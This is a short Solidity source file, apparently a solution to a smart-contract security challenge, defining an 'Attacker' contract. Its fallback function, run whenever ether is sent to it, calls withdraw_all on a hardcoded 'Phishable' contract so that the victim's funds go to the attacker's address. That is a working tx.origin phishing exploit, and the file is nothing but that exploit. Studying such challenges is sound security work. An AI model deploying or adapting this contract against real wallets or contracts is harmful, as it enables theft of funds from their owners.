pragma solidity ^0.5.16;

interface Phishable {
  function withdraw_all(address) external;
}

contract Attacker {
  address attacker;
  Phishable phisher = Phishable(0x3Dde091e4A4f47B47B7767E26290E9cB14444fFD);

  constructor(address receiver) public {
    attacker = receiver;
  }

  function () external payable {
    phisher.withdraw_all(attacker);
  }
}

//0xe67B7c990D12681a418704cB59fcbE45405275BB